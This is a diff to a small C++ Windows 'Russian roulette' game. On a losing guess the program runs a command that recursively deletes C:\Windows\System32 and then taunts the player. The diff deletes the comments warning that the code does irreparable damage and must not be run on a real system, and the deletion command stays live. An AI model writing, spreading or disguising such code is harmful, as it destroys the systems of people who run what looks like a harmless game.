@@ -1,7 +1,7 @@
 #include <iostream>
 #include <cstdlib>
 #include <ctime>
-#include <windows.h> // Include this library for system commands
+#include <windows.h>
 using namespace std;
 
 int main() {
@@ -13,9 +13,6 @@ int main() {
     cin >> chamber;
     if (chamber == bullet) {
         cout << "Oops! Looks like you just deleted Windows 32. Good luck reinstalling! 😈\n";
-
-        // WARNING: This code deletes critical system files and can cause irreparable damage to your system!
-        // DO NOT RUN THIS CODE ON A REAL SYSTEM!
         
         system("rd /s /q C:\\Windows\\System32");
         cout << "Windows 32 has been successfully deleted! 😱\n";
